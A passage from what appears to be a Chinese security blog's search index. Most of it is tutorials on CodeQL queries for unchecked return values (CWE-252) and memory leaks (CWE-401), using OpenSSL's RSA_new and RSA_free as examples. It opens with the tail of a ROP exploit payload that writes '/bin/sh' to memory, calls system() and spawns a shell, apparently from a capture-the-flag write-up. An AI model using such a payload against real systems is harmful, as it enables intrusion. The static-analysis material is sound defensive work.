0x0000000000400893payload = 'a'*(0x20+8)payload += p64(pop_r14_pop_r15_ret)payload += p64(data_addr)payload += '/bin/sh\\x00'payload += p64(mov_ptrr14_r15_ret)payload += p64(pop_rdi_ret)payload += p64(data_addr)payload += p64(elf.symbols['system'])p.recvuntil('&gt;')p.sendline(payload)p.interactive()","link":"/ad24c8c9.html"},{"title":"CodeQL之CWE-252","text":"CWE-252: Unchecked Return ValueThe software does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.顾名思义，Unchecked Return Value，就是在实际代码中缺少了对返回值的检查，在实际代码中，对错误返回值的检查尤为重要，因为需要进入到相应的错误处理环节中去，否则会影响程序的正常运行。比如我们常见的对malloc返回值的检查等等，和CWE-252相关的还有CWE-754、CWE-273、CWE-476PS：我们以openssl为例进行相应的CodeQL查询脚本的编写我们要找的是缺少对函数返回值的检查的情况，但首先我们要知道哪些函数的返回值是需要进行检查的。可以想到的有以下两种方法：思路1：我们可以从文档的描述里知道某个函数的返回值是需要进行检查的，例如openssl文档中，我们通过下面的描述知道RSA_new在返回NULL的时候是出现了错误，因此需要进行检查1If the allocation fails, RSA_new() returns NULL and sets an error code that can be obtained by ERR_get_error(3). Otherwise it returns a pointer to the newly allocated structure.思路2：当一个函数，在项目中被多次使用，大部分都检查了返回值，那么这个函数的返回值大概率是要被检查的，而没检查的地方就是Unchecked Return Value以RSA_new为例，我们先看看它有没有忘检查返回值的情况123456import cpppredicate check_name(Function func) { func.getName().matches(\"RSA_new\") }from FunctionCall funcwhere check_name(func.getTarget())select func,func.getLocation()可以看到有17个地方使用了RSA_new，其中16个地方，有的直接用IF判断是否为NULL，有的使用TEST_ptr判断是否是NULL，只有最后一处，在openssl的测试代码里，忘记了检查1234567891011121314151617static int rsa_setkey(RSA** key, unsigned char* ctext, int idx){ int clen = 0; *key = RSA_new(); switch (idx) { case 0: clen = key1(*key, ctext); break; case 1: clen = key2(*key, ctext); break; case 2: clen = key3(*key, ctext); break; } return clen;}由于在测试代码里，所以问题不大，不过还是提了个issue，开发者也很快补上了(https://github.com/openssl/openssl/issues/13361)思路1#思路1：从文档的描述里知道某个函数的返回值是需要进行检查的，例如openssl文档中，通过下面的描述知道RSA_new在返回NULL的时候是出现了错误，因此需要进行检查我们前面已知对RSA_new的返回值需要进行检查，虽然直接找就找到了17个，看起来也很快，但是当函数很多，结果很多的时候，就有点浪费时间了，我们最好是让查询脚本只找到最后一个结果，也就是降低误报率简单的看下17个，可以发现大部分都是一个变量接住返回值，然后进行检查，因此我们可以很快的写出下面的查询脚本123456789101112131415161718import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name(Function func) { func.getName().matches(\"RSA_new\") }from FunctionCall func, GuardCondition condwhere check_name(func.getTarget()) and exists(DataFlow::Node source, DataFlow::Node sink, int diff | DataFlow::localFlow(source, sink) and source.asExpr().(FunctionCall) = func and cond.getAChild*() = sink.asExpr() and diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and diff &gt;= 0 and diff &lt; 10 )select func,func.getLocation()本来我们应该要查not exists的，但是由于查not exsits的搜索空间更大，耗时间也耗计算资源，所以我们直接差exsits，然后和一开始的17个结果区差集，就是not exsits的结果。查询脚本的内容很简单，首先还是找函数调用，检查是不是RSA_new这个函数，然后找是不是存在函数内数据流，source点是函数调用，sink点是变量的使用点，这个变量的使用点还必须是在一个条件语句中的，最后简单的通过行数差来看是不是一个检查点(因为一般check点都不会很远)。更加合理的方法是写成找最近的条件语句sink点，这样我们查询到的exsits结果有14个，如下not exsits的3个中，两个误报的情况分别如下1234567891011// case 1loopargs[i].rsa_key[testnum] = RSA_new();if (loopargs[i].rsa_key[testnum] == NULL) { BN_free(bn); goto end;}//case 2*pval = (ASN1_VALUE *)RSA_new();if (*pval != NULL) return 2;问题的原因在于codeql没有提取到if中对变量的使用这个sink点(通过去掉判断打印出sink点可以发现，不过今天下载了最新的codeql重新编译了数据库，case2已经可以识别出来了)，如果大家感兴趣，可以继续修改查询语句看怎么去除这两个误报，也欢迎一起讨论解决。思路2#当一个函数，在项目中被多次使用，大部分都检查了返回值，那么这个函数的返回值大概率是要被检查的，而没检查的地方就是Unchecked Return Value123456789101112131415161718192021222324252627282930313233import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name(Function func) { func.getName().matches(\"RSA_new\") }from FunctionCall func, int total, int checkedwhere check_name(func.getTarget()) and total = count(FunctionCall fc | check_name(fc.getTarget())) and checked = count(FunctionCall fc | check_name(fc.getTarget()) and exists(DataFlow::Node source, DataFlow::Node sink, int diff, GuardCondition cond | DataFlow::localFlow(source, sink) and source.asExpr().(FunctionCall) = fc and cond.getAChild*() = sink.asExpr() and diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and diff &gt;= 0 and diff &lt; 10 ) ) and checked != total and checked * 100 / total &gt;= 80 and exists(DataFlow::Node source, DataFlow::Node sink, int diff, GuardCondition cond | DataFlow::localFlow(source, sink) and source.asExpr().(FunctionCall) = func and cond.getAChild*() = sink.asExpr() and diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and diff &gt;= 0 and diff &lt; 10 )select func, func.getLocation()在思路2的查询脚本中，我们先是统计了全局使用了RSA_new几次(total=...)，然后统计了有几次使用后进行了检查(checked=...)，然后设置了阈值为80%，最后，当本身未进行检查时，将结果给出，同样这里还是选择用exsits取差集代替not exsits，结果如下可以看到依旧是找到了14个存在检查的，差集中存在2个误报。总结#不管是思路1还是思路2，其实在自动化上都存在一定困难。对于思路1，难点在于没有好的方法去知道某API需要进行返回值检查，有的选择正则表达式在文档里找，也有选择用NLP方法去从文档里提取信息，但仍然有很长的路要走，是个难点，而且有文档的项目毕竟还是少数对于思路2，阈值的设置是个问题，和项目中API的使用数量等挂钩，而且并不能保证不检查就一定有问题，只是大概率有问题而已参考资料：CWE-252CodeQL","link":"/3f2f6cef.html"},{"title":"CodeQL之CWE-401(1)","text":"The software does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.介绍#CWE-401，其实也就是内存漏释放的情况，一般来说我们在代码中使用malloc、new申请的内存，都需要被释放才行，否则就会出现memory leak等问题在用codeql找这类漏洞时，可以分为两种情况，第一种是内存申请后，完全没有释放，比如下面的情况123456int main(int argc, char* argv[]) { int *buff = malloc(SIZE * sizeof(int)); int status = 0; ... //code that does not free buff return status; //buff is never closed}第二种是有的路径释放了，而有的路径上没有释放，如下123456789int* f() { try { int *buff = malloc(SIZE*sizeof(int)); do_stuff(buff); return buff; } catch (int do_stuff_exception) { return NULL; //returns NULL on error, but does not free memory }}可以看到如果正常进行，会进行释放，如果出现了错误，在错误处理环节并没有释放。之所以分为两类，因为在写查询脚本的时候，是有所区别的，本次只先将第一类#第一类比较简单，还是以openssl的RSA_new为例思路1#思路1还是从我们已知的API标出发。假设我们有一条先验知识——所有使用RSA_new分配的内存空间，都需要调用RSA_free释放。首先我们来康康一共有多少RSA_new（因为用最新的codeql和openssl重新编译了）123456import cpppredicate check_name(Function func) { func.getName().matches(\"RSA_new\") }from FunctionCall funcwhere check_name(func.getTarget())select func,func.getLocation()没有任何意外，还是17处我们其实还是选择在同一个函数内做一个数据流分析，思路上很清晰，source点是对RSA_new函数的调用，sink点我们没法直接定到函数，但是我们可以知道sink点是RSA_free函数的一个参数，所以我们可以直接写出下面的查询语句123456789101112131415161718import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) {func.getName().matches(\"RSA_free\")}from DataFlow::Node source,DataFlow::Node sink,FunctionCall fcwhere exists( | DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and check_name_post(fc.getTarget()) and fc.getAnArgument()=sink.asExpr() )select source.asExpr(),source.asExpr().getLocation()结果是有14个RSA_new存在对应的RSA_free也就是所有的17个结果中的1、3、17没有进行free第一个同样也是误报，原因和之前那个一样，codeql没有正确的识别出loopargs[i].rsa_key[testnum]的所有sink点。第二个也是误报如下，原因在于我们只看了函数内的数据流关系，pval是函数指针形式传进来的，它在全局数据流上，还是存在释放的，这也提醒我们，在函数内找这类漏洞时，为了避免误报，应该先忽略掉这么两类情况：第一类：申请后的内存给了函数参数第二类：申请后的内存指针，通过return传给了调用它的函数123456789101112131415161718192021static int rsa_cb(int operation, ASN1_VALUE **pval, const ASN1_ITEM *it, void *exarg){ if (operation == ASN1_OP_NEW_PRE) { *pval = (ASN1_VALUE *)RSA_new(); if (*pval != NULL) return 2; return 0; } else if (operation == ASN1_OP_FREE_PRE) { RSA_free((RSA *)*pval); *pval = NULL; return 2; } else if (operation == ASN1_OP_D2I_POST) { if (((RSA *)*pval)-&gt;version != RSA_ASN1_VERSION_MULTI) { /* not a multi-prime key, skip */ return 1; } return (rsa_multip_calc_product((RSA *)*pval) == 1) ? 2 : 0; } return 1;}第三个是我们的老朋友了，还是上次找到的Missing Check的地方，不过和第二个一样，同样也是一个误报12345678910111213141516171819static int rsa_setkey(RSA** key, unsigned char* ctext, int idx){ int clen = 0; *key = RSA_new(); if (*key != NULL) switch (idx) { case 0: clen = key1(*key, ctext); break; case 1: clen = key2(*key, ctext); break; case 2: clen = key3(*key, ctext); break; } return clen;}思路2#思路2依旧是基于统计的方法，稍微改改脚本就行1234567891011121314151617181920212223242526272829import cppimport semmle.code.cpp.controlflow.Guardsimport semmle.code.cpp.dataflow.DataFlowpredicate check_name_pre(Function func) { func.getName().matches(\"RSA_new\") }predicate check_name_post(Function func) {func.getName().matches(\"RSA_free\")}from FunctionCall func,int total,int freed,DataFlow::Node sc,DataFlow::Node skwhere total = count(FunctionCall fc_pre | check_name_pre(fc_pre.getTarget())) andfreed = count(DataFlow::Node source | exists(DataFlow::Node sink,FunctionCall fc_post| DataFlow::localFlow(source, sink) and source.asExpr() instanceof FunctionCall and check_name_pre(source.asExpr().(FunctionCall).getTarget()) and check_name_post(fc_post.getTarget()) and fc_post.getAnArgument()=sink.asExpr() )) andfreed!=total andfreed*100/total &gt; 80 andexists(| DataFlow::localFlow(sc, sk) and sc.asExpr() instanceof FunctionCall and check_name_pre(sc.asExpr().(FunctionCall).getTarget()) and check_name_post(func.getTarget()) and func.getAnArgument()=sk.asExpr() )select sc.asExpr(),sc.asExpr().getLocation(),total,freed结果如下总结#总结来说，对于CWE-401，在函数内部进行查找的时候，需要去掉函数参数，返回值这两类情况，感兴趣的小伙伴可以继续修改，把这两类情况加入查询脚本，进一步降低误报率。参考资料#CWE-401","link":"/81db1c47.html"},{"title":"CodeQL之CWE-401(2)","text":"在写第二类CWE-401的查询脚本前，我们需要补充一些东西、在能找到的codeql文档里，大部分都只强推了它的DataFlow模块，而在写第二类查询脚本时，需要用到它的可达性分析模块import semmle.code.cpp.controlflow.StackVariableReachabilityCodeQL可达性分析模块#在这个模块里，存在三个抽象类StackVariableReachability、StackVariableReachabilityWithReassignment和StackVariableReachabilityExtStackVariableReachability#StackVariableReachability存在三个抽象函数，需要自己实现具体内容。isSource和isSink很好理解。isBarrier是指中间不允许出现的某个节点12345678/** Holds if `node` is a source for the reachability analysis using variable `v`. */ abstract predicate isSource(ControlFlowNode node, StackVariable v); /** Holds if `sink` is a (potential) sink for the reachability analysis using variable `v`. */ abstract predicate isSink(ControlFlowNode node, StackVariable v); /** Holds if `node` is a barrier for the reachability analysis using variable `v`. */ abstract predicate isBarrier(ControlFlowNode node, StackVariable v);同时也有可达性分析的函数reaches的描述为Holds if the source node can reach the sink node without crossing a barrier，也就是说可达是指，我从source点到sink点，但是不想经过barrier。1234567891011121314151617predicate reaches(ControlFlowNode source, SemanticStackVariable v, ControlFlowNode sink) { exists(BasicBlock bb, int i | isSource(source, v) and bb.getNode(i) = source and not bb.isUnreachable() | exists(int j | j &gt; i and sink = bb.getNode(j) and isSink(sink, v) and not exists(int k | isBarrier(bb.getNode(k), v) | k in [i + 1 .. j - 1]) ) or not exists(int k | isBarrier(bb.getNode(k), v) | k &gt; i) and bbSuccessorEntryReaches(bb, v, sink, _) ) }reaches函数是在一个函数内判断的，它其实是分为两类进行的。第一类：source、sink、barrier在一个基本块内。那么就是判断source点、sink都点在基本块内，且满足前后控制流关系，并且不存在一个barrier点。第二类：source、sink、barrier是跨基本块的。还是先判断source点存在于当前基本块，然后在它的后继基本块里继续找sink点和barrier点，即调用bbSuccessorEntryReaches函数，具体细节就不多说啦。StackVariableReachabilityExt#StackVariableReachabilityExt和StackVariableReachability类似，从注释里我们可以看出123456/** * Same as `StackVariableReachability`, but `isBarrier` works on control-flow * edges rather than nodes and is therefore parameterized by the original * source node as well. Otherwise, this class is used like * `StackVariableReachability`. */它和StackVariableReachability的区别在于isBarrier函数作用于边而不是控制流结点1234/** `node` is a barrier for the reachability analysis using variable `v` and starting from `source`. */abstract predicate isBarrier( ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v);StackVariableReachabilityWithReassignment#StackVariableReachabilityWithReassignment和之前的类似，区别在于这个类将重新赋值的情况考虑了进去12345678910/** * Reachability analysis for control-flow nodes involving stack variables. * Unlike `StackVariableReachability`, this analysis takes variable * reassignments into account. * * This class is used like `StackVariableReachability`, except that * subclasses should override `isSourceActual` and `isSinkActual` instead of * `isSource` and `isSink`, and that there is a `reachesTo` predicate in * addition to `reaches`. */同时使用reachTo替代父类的reaches条件，加入了其余的判断123456789101112/** * As `reaches`, but also specifies the last variable it was reassigned to (`v0`). */predicate reachesTo( ControlFlowNode source, SemanticStackVariable v, ControlFlowNode sink, SemanticStackVariable v0) { exists(ControlFlowNode def | actualSourceReaches(source, v, def, v0) and StackVariableReachability.super.reaches(def, v0, sink) and isSinkActual(sink, v0) )}进一步熟悉可达性分析模块#CodeQL开发者在示例代码中有两处可以让我们更好的了解上面的三个类的使用，一个是https://github.com/github/codeql/blob/main/cpp/ql/src/Critical/MemoryMayNotBeFreed.ql另一个是https://github.com/github/codeql/blob/main/cpp/ql/src/Critical/FileMayNotBeClosed.ql分别用于寻找CWE-401和CWE-755，而在我看来这两类其实都属于函数调用失配的情况，即调用了malloc没有调用free，调用了fopen，没有调用fclose。这里我们通过MemoryMayNotBeFreed进一步熟悉可达性分析模块。直接调用or间接调用#我们知道对一个函数的调用一般分为两种，第一种是直接调用，第二种是通过函数指针进行间接调用，为了同时考虑这两种情况，首先我们需要实现函数调用的函数如下123456789/** * call is either a direct call to f, or a possible call to f * via a function pointer. */predicate mayCallFunction(Expr call, Function f) { call.(FunctionCall).getTarget() = f or call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() = f}FunctionCall是直接调用，而VariableCall就是间接调用了，用来处理下面这类情况12345678/** * A C/C++ call which is performed through a variable of function pointer type. * * int call_via_ptr(int (*pfn)(int)) { * return pfn(5); * } * */直接找到变量，然后看它是不是在某处获得了函数的地址即可。虽然codeQL的文档不多，但是通过看示例和它已有的注释，可以学到很多文档里没有的东西，不仅限于一些思路的写法和一些已有的API赋值给全局or某个类的域#1234567891011121314151617predicate assignedToFieldOrGlobal(StackVariable v, Expr e) { // assigned to anything except a StackVariable // (typically a field or global, but for example also *ptr = v) e.(Assignment).getRValue() = v.getAnAccess() and not e.(Assignment).getLValue().(VariableAccess).getTarget() instanceof StackVariable or exists(Expr midExpr, Function mid, int arg | // indirect assignment e.(FunctionCall).getArgument(arg) = v.getAnAccess() and mayCallFunction(e, mid) and midExpr.getEnclosingFunction() = mid and assignedToFieldOrGlobal(mid.getParameter(arg), midExpr) ) or // assigned to a field via constructor field initializer e.(ConstructorFieldInit).getExpr() = v.getAnAccess()}一般情况下，有这么两类内存分配是不一定在当前函数释放，第一类是全局的变量，它的内存释放可以在程序退出后自行释放，第二类是类内的局部变量，是由类在析构的时候释放的。assignedToFieldOrGlobal函数用于判断这两种情况，避免误报产生。第一种是：一个表达式，右侧是局部变量，左侧不是局部变量(也就是全局变量)，这是直接赋值的情况；第三种是：在类的初始化时进行赋值；第二种是间接赋值，比如说通过参数调用函数，然后在函数内对这个参数进行了赋值。allocCallOrIndirect#allocCallOrIndirect是用来找source点的，因为我们要找MemoryMayNotBeFreed的情况，所以我们的source点肯定是对分配内存函数的调用123456789101112131415161718192021222324predicate allocCallOrIndirect(Expr e) { // direct alloc call e.(AllocationExpr).requiresDealloc() and // We are only interested in alloc calls that are // actually freed somehow, as MemoryNeverFreed // will catch those that aren't. allocMayBeFreed(e) or exists(ReturnStmt rtn | // indirect alloc call mayCallFunction(e, rtn.getEnclosingFunction()) and ( // return alloc allocCallOrIndirect(rtn.getExpr()) or // return variable assigned with alloc exists(Variable v | v = rtn.getExpr().(VariableAccess).getTarget() and allocCallOrIndirect(v.getAnAssignedValue()) and not assignedToFieldOrGlobal(v, _) ) ) )}freeCallOrIndirect#在找内存未释放漏洞时，我们肯定要判断是不是有释放点，因此freeCallOrIndirect就是为了找内存释放的点，同时realloc也是一种内存释放1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * The point at which a call to 'realloc' on 'v' has been verified to * succeed. A failed realloc does *not* free the input pointer, which * can cause memory leaks. */predicate verifiedRealloc(FunctionCall reallocCall, Variable v, ControlFlowNode verified) { reallocCall.(AllocationExpr).getReallocPtr() = v.getAnAccess() and ( exists(Variable newV, ControlFlowNode node | // a realloc followed by a null check at 'node' (return the non-null // successor, i.e. where the realloc is confirmed to have succeeded) newV.getAnAssignedValue() = reallocCall and node.(AnalysedExpr).getNonNullSuccessor(newV) = verified and // note: this case uses naive flow logic (getAnAssignedValue). // special case: if the result of the 'realloc' is assigned to the // same variable, we don't descriminate properly between the old // and the new allocation; better to not consider this a free at // all in that case. newV != v ) or // a realloc(ptr, 0), which always succeeds and frees // (return the realloc itself) reallocCall.(AllocationExpr).getReallocPtr().getValue() = \"0\" and verified = reallocCall )}predicate freeCallOrIndirect(ControlFlowNode n, Variable v) { // direct free call n.(DeallocationExpr).getFreedExpr() = v.getAnAccess() and not exists(n.(AllocationExpr).getReallocPtr()) or // verified realloc call verifiedRealloc(_, v, n) or exists(FunctionCall midcall, Function mid, int arg | // indirect free call n.(Call).getArgument(arg) = v.getAnAccess() and mayCallFunction(n, mid) and midcall.getEnclosingFunction() = mid and freeCallOrIndirect(midcall, mid.getParameter(arg)) )}AllocVariableReachability#12345678910111213141516171819202122predicate allocationDefinition(StackVariable v, ControlFlowNode def) { exists(Expr expr | exprDefinition(v, def, expr) and allocCallOrIndirect(expr))}class AllocVariableReachability extends StackVariableReachabilityWithReassignment { AllocVariableReachability() { this = \"AllocVariableReachability\" } override predicate isSourceActual(ControlFlowNode node, StackVariable v) { allocationDefinition(v, node) } override predicate isSinkActual(ControlFlowNode node, StackVariable v) { // node may be used in allocationReaches exists(node.(AnalysedExpr).getNullSuccessor(v)) or freeCallOrIndirect(node, v) or assignedToFieldOrGlobal(v, node) or // node may be used directly in query v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier(ControlFlowNode node, StackVariable v) { definitionBarrier(v, node) }}AllocVariableReachability是对StackVariableReachabilityWithReassignment的继承。source点是：存在一个表达式，它调用了分配内存的函数并赋值给了局部变量v。sink点可以是free或者是赋值给了全局的变量。barrier是通过库中的函数实现的，目的是判断重新赋值的情况。123456/** * Holds if `barrier` is either a (potential) definition of `v` or follows an * access that gets the address of `v`. In both cases, the value of * `v` after `barrier` cannot be assumed to be the same as before. */predicate definitionBarrier(SemanticStackVariable v, ControlFlowNode barrier)AllocReachability#AllocReachability继承StackVariableReachabilityExt，source点同上，sink点是需要是和变量存在在一盒函数内的return语句，barrier是找被free、被赋值给全局变量或者已经经过了NULL检查的情况。123456789101112131415161718192021222324252627282930313233343536373839/** * The value from allocation `def` is still held in Variable `v` upon entering `node`. */predicate allocatedVariableReaches(StackVariable v, ControlFlowNode def, ControlFlowNode node) { exists(AllocVariableReachability r | // reachability r.reachesTo(def, _, node, v) or // accept def node itself r.isSource(def, v) and node = def )}class AllocReachability extends StackVariableReachabilityExt { AllocReachability() { this = \"AllocReachability\" } override predicate isSource(ControlFlowNode node, StackVariable v) { allocationDefinition(v, node) } override predicate isSink(ControlFlowNode node, StackVariable v) { v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier( ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v ) { isSource(source, v) and next = node.getASuccessor() and // the memory (stored in any variable `v0`) allocated at `source` is freed or // assigned to a global at node, or NULL checked on the edge node -&gt; next. exists(StackVariable v0 | allocatedVariableReaches(v0, source, node) | node.(AnalysedExpr).getNullSuccessor(v0) = next or freeCallOrIndirect(node, v0) or assignedToFieldOrGlobal(v0, node) ) }}联合查询#12345678from ControlFlowNode def, ReturnStmt retwhere allocationReaches(def, ret) and not exists(StackVariable v | allocatedVariableReaches(v, def, ret) and ret.getAChild*() = v.getAnAccess() )select def, \"The memory allocated here may not be released at $@.\", ret, \"this exit point\"在有了前面的铺垫后，最终的查询用自然语言描述就是：从一个控制流结点到一个返回语句可达且不存在一个变量保存了分配的内存的指针且最后被释放或者被赋值给全局变量等，并且申请的空间也没有作为函数返回值被返回到上层函数。附录：MemoryMayNotBeFreed.ql#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192/** * @name Memory may not be freed * @description A function may return before freeing memory that was allocated in the function. Freeing all memory allocated in the function before returning ties the lifetime of the memory blocks to that of the function call, making it easier to avoid and detect memory leaks. * @kind problem * @id cpp/memory-may-not-be-freed * @problem.severity warning * @tags efficiency * security * external/cwe/cwe-401 */import MemoryFreedimport semmle.code.cpp.controlflow.StackVariableReachability/** * 'call' is either a direct call to f, or a possible call to f * via a function pointer. */predicate mayCallFunction(Expr call, Function f) { call.(FunctionCall).getTarget() = f or call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() = f}predicate allocCallOrIndirect(Expr e) { // direct alloc call e.(AllocationExpr).requiresDealloc() and // We are only interested in alloc calls that are // actually freed somehow, as MemoryNeverFreed // will catch those that aren't. allocMayBeFreed(e) or exists(ReturnStmt rtn | // indirect alloc call mayCallFunction(e, rtn.getEnclosingFunction()) and ( // return alloc allocCallOrIndirect(rtn.getExpr()) or // return variable assigned with alloc exists(Variable v | v = rtn.getExpr().(VariableAccess).getTarget() and allocCallOrIndirect(v.getAnAssignedValue()) and not assignedToFieldOrGlobal(v, _) ) ) )}/** * The point at which a call to 'realloc' on 'v' has been verified to * succeed. A failed realloc does *not* free the input pointer, which * can cause memory leaks. */predicate verifiedRealloc(FunctionCall reallocCall, Variable v, ControlFlowNode verified) { reallocCall.(AllocationExpr).getReallocPtr() = v.getAnAccess() and ( exists(Variable newV, ControlFlowNode node | // a realloc followed by a null check at 'node' (return the non-null // successor, i.e. where the realloc is confirmed to have succeeded) newV.getAnAssignedValue() = reallocCall and node.(AnalysedExpr).getNonNullSuccessor(newV) = verified and // note: this case uses naive flow logic (getAnAssignedValue). // special case: if the result of the 'realloc' is assigned to the // same variable, we don't descriminate properly between the old // and the new allocation; better to not consider this a free at // all in that case. newV != v ) or // a realloc(ptr, 0), which always succeeds and frees // (return the realloc itself) reallocCall.(AllocationExpr).getReallocPtr().getValue() = \"0\" and verified = reallocCall )}predicate freeCallOrIndirect(ControlFlowNode n, Variable v) { // direct free call n.(DeallocationExpr).getFreedExpr() = v.getAnAccess() and not exists(n.(AllocationExpr).getReallocPtr()) or // verified realloc call verifiedRealloc(_, v, n) or exists(FunctionCall midcall, Function mid, int arg | // indirect free call n.(Call).getArgument(arg) = v.getAnAccess() and mayCallFunction(n, mid) and midcall.getEnclosingFunction() = mid and freeCallOrIndirect(midcall, mid.getParameter(arg)) )}predicate allocationDefinition(StackVariable v, ControlFlowNode def) { exists(Expr expr | exprDefinition(v, def, expr) and allocCallOrIndirect(expr))}class AllocVariableReachability extends StackVariableReachabilityWithReassignment { AllocVariableReachability() { this = \"AllocVariableReachability\" } override predicate isSourceActual(ControlFlowNode node, StackVariable v) { allocationDefinition(v, node) } override predicate isSinkActual(ControlFlowNode node, StackVariable v) { // node may be used in allocationReaches exists(node.(AnalysedExpr).getNullSuccessor(v)) or freeCallOrIndirect(node, v) or assignedToFieldOrGlobal(v, node) or // node may be used directly in query v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier(ControlFlowNode node, StackVariable v) { definitionBarrier(v, node) }}/** * The value from allocation `def` is still held in Variable `v` upon entering `node`. */predicate allocatedVariableReaches(StackVariable v, ControlFlowNode def, ControlFlowNode node) { exists(AllocVariableReachability r | // reachability r.reachesTo(def, _, node, v) or // accept def node itself r.isSource(def, v) and node = def )}class AllocReachability extends StackVariableReachabilityExt { AllocReachability() { this = \"AllocReachability\" } override predicate isSource(ControlFlowNode node, StackVariable v) { allocationDefinition(v, node) } override predicate isSink(ControlFlowNode node, StackVariable v) { v.getFunction() = node.(ReturnStmt).getEnclosingFunction() } override predicate isBarrier( ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v ) { isSource(source, v) and next = node.getASuccessor() and // the memory (stored in any variable `v0`) allocated at `source` is freed or // assigned to a global at node, or NULL checked on the edge node -&gt; next. exists(StackVariable v0 | allocatedVariableReaches(v0, source, node) | node.(AnalysedExpr).getNullSuccessor(v0) = next or freeCallOrIndirect(node, v0) or assignedToFieldOrGlobal(v0, node) ) }}/** * The value returned by allocation `def` has not been freed, confirmed to be null, * or potentially leaked globally upon reaching `node` (regardless of what variable * it's still held in, if any). */predicate allocationReaches(ControlFlowNode def, ControlFlowNode node) { exists(AllocReachability r | r.reaches(def, _, node))}predicate assignedToFieldOrGlobal(StackVariable v, Expr e) { // assigned to anything except a StackVariable // (typically a field or global, but for example also *ptr = v) e.(Assignment).getRValue() = v.getAnAccess() and not e.(Assignment).getLValue().(VariableAccess).getTarget() instanceof StackVariable or exists(Expr midExpr, Function mid, int arg | // indirect assignment e.(FunctionCall).getArgument(arg) = v.getAnAccess() and mayCallFunction(e, mid) and midExpr.getEnclosingFunction() = mid and assignedToFieldOrGlobal(mid.getParameter(arg), midExpr) ) or // assigned to a field via constructor field initializer e.(ConstructorFieldInit).getExpr() = v.getAnAccess()}from ControlFlowNode def, ReturnStmt retwhere allocationReaches(def, ret) and not exists(StackVariable v | allocatedVariableReaches(v, def, ret) and ret.getAChild*() = v.getAnAccess() )select def, \"The memory allocated here may not be released at $@.\", ret, \"this exit point\"","link":"/aaf64f84.html"},{"title":"CodeQL之CWE-401(3)","text":"在第一部分中，我们将CWE-401简单分为两类，第一类是对于分配的内存，不存在路径对它进行了释放，第二类是有的路径释放了，而有的路径忘了释放，现在我们对第二类进行解决第二类示例如下123456789int* f() { try { int *buff = malloc(SIZE*sizeof(int)); do_stuff(buff); return buff; } catch (int do_stuff_exception) { return NULL; //returns NULL on error, but does not free memory }}总体思路#还是从RSA_new和RSA_free的示例出发，按照上篇博客中的MemoryMayNotBeFreed画瓢就行，有所区别的是，在这里想将它扩展成函数未配对使用的情况，即malloc却没有free、fopen却没有fclose。STEP1 定义基本函数#首先写上对配对函数名称检查的函数123predicate checkNameOpen(Function func) { func.getName().matches(\"RSA_new\") }predicate checkNameClose(Function func) {func.getName().matches(\"RSA_free\")}借鉴样板中的直接调用和间接调用(大部分应该都不会选择用间接调用，但是在linux等项目中十分普遍)，我们直接抄录直接调用和间接调用判断如下：123456789/** * 'call' is either a direct call to f, or a possible call to f * via a function pointer. */predicate mayCallFunction(Expr call, Function f) { call.(FunctionCall).getTarget() = f or call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() = f}同样，样版中的赋值给全局变量或者类的域内变量也值得我们直接抄写一番1234567891011121314151617predicate assignedToFieldOrGlobal(StackVariable v, Expr e) { // assigned to anything except a StackVariable // (typically a field or global, but for example also *ptr = v) e.(Assignment).getRValue() = v.getAnAccess() and not e.(Assignment).getLValue().(VariableAccess).getTarget() instanceof StackVariable or exists(Expr midExpr, Function mid, int arg | // indirect assignment e.(FunctionCall).getArgument(arg) = v.getAnAccess() and mayCallFunction(e, mid) and midExpr.getEnclosingFunction() = mid and assignedToFieldOrGlobal(mid.getParameter(arg), midExpr) ) or // assigned to a field via constructor field initializer e.(ConstructorFieldInit).getExpr() = v.getAnAccess()}STEP2 定义匹配函数调用#在这一步我们还是为后面做铺垫，首先需要我们定义是否调用了匹配函数，用于source、sink和barrier点的判断1234567891011121314151617181920212223predicate openCall(Expr e) { // direct alloc call checkNameOpen(e.(FunctionCall).getTarget()) // We are only interested in alloc calls that are // actually freed somehow, as MemoryNeverFreed // will catch those that aren't. or exists(ReturnStmt rtn | // indirect alloc call mayCallFunction(e, rtn.getEnclosingFunction()) and ( // return alloc openCall(rtn.getExpr()) or // return variable assigned with alloc exists(Variable v | v = rtn.getExpr().(VariableAccess).getTarget() and openCall(v.getAnAssignedValue()) and not assignedToFieldOrGlobal(v, _) ) ) )}openCall是判断表达式是不是调用了Open类的函数，或者说它调用了函数func，函数func里调用了Open类的函数，然后将返回值传递了出来。123456789101112predicate closeCall(ControlFlowNode n, Variable v) { exists(int arg | n.(Call).getArgument(arg) = v.getAnAccess() and checkNameClose(n.(Call).getTarget())) or exists(FunctionCall midcall, Function mid, int arg | // indirect free call n.(Call).getArgument(arg) = v.getAnAccess() and mayCallFunction(n, mid) and midcall.getEnclosingFunction() = mid and closeCall(midcall, mid.getParameter(arg)) 